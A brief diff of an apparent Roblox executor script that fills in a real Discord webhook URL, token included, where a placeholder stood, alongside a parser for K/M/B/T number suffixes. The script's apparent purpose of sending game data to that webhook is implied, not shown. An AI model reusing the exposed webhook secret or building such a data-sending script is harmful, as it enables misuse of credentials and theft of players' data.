@@ -5,7 +5,7 @@ local Http = game:GetService("HttpService")
 local lp = Players.LocalPlayer
 local req = request or http_request or (syn and syn.request)
 
-local hook = "WEBHOOK HERE"
+local hook = "https://discord.com/api/webhooks/1542269825382875236/AiS6s_oqrA4Sexv9H48MWZpdvFRJoF3Qfo1ik4JLrhWNTaiECoxRyaNwPqgYwmjM5hK9"
 
 -- ===== suffix parser (only K, M, B, T) =====
 local function num(str)
